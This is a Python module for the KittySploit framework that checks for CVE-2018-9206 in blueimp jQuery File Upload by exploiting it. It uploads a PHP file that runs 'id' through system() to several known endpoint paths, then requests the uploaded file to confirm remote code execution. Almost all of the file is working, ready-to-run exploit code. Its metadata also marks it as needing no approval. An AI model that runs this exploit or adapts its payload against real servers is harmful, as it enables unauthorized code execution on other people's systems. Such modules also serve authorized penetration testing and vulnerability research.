#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Blueimp jQuery File Upload unauthenticated RCE (CVE-2018-9206)."""

import re
from urllib.parse import urlparse

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'jQuery File Upload - Unauth Upload RCE Detection (CVE-2018-9206)',
        'description': (
            'Detects CVE-2018-9206 by uploading a PHP one-liner via blueimp jQuery-File-Upload '
            'endpoints and executing id.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': [
            'web', 'scanner', 'cve', 'cve2018', 'jquery', 'upload', 'rce', 'unauth', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 4,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'risk_signal', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2018-9206',
            'https://www.exploit-db.com/exploits/45790',
        ],
        'cve': 'CVE-2018-9206',
    }

    ENDPOINTS = (
        ('/server/php/upload.class.php', '/server/php/index.php'),
        ('/server/php/UploadHandler.php', '/server/php/index.php'),
        ('/example/upload.php', '/example/upload.php'),
        ('/php/index.php', '/php/index.php'),
        ('/jQuery-File-Upload/server/php/index.php', '/jQuery-File-Upload/server/php/index.php'),
    )

    def run(self):
        fname = self.random_text(8) + '.php'
        bound = '------------------------' + self.random_text(12)
        body = (
            '--' + bound + '\r\n'
            'Content-Disposition: form-data; name="files[]"; filename="' + fname + '"\r\n'
            'Content-Type: application/octet-stream\r\n\r\n'
            '<?php system(id); unlink(__FILE__); ?>\r\n\r\n'
            '--' + bound + '--\r\n'
        )
        headers = {'Content-Type': f'multipart/form-data; boundary={bound}'}
        for probe, upload in self.ENDPOINTS:
            p = self.http_request(method='GET', path=probe, allow_redirects=False)
            if not p or p.status_code != 200:
                continue
            r = self.http_request(
                method='POST', path=upload, data=body, headers=headers, allow_redirects=False,
            )
            if not r:
                continue
            text = r.text or ''
            m = re.search(r'"url"\s*:\s*"([^"]+)"', text)
            if not m:
                continue
            url = m.group(1).replace('\\/', '/')
            if url.startswith('http'):
                url = urlparse(url).path or url
            if not url.startswith('/'):
                url = '/' + url
            g = self.http_request(method='GET', path=url, allow_redirects=False)
            if g and re.search(r'uid=\d+.*gid=\d+', g.text or ''):
                self.set_info(
                    severity='critical',
                    reason='jQuery File Upload RCE (CVE-2018-9206)',
                    path=upload,
                )
                return True
        return False
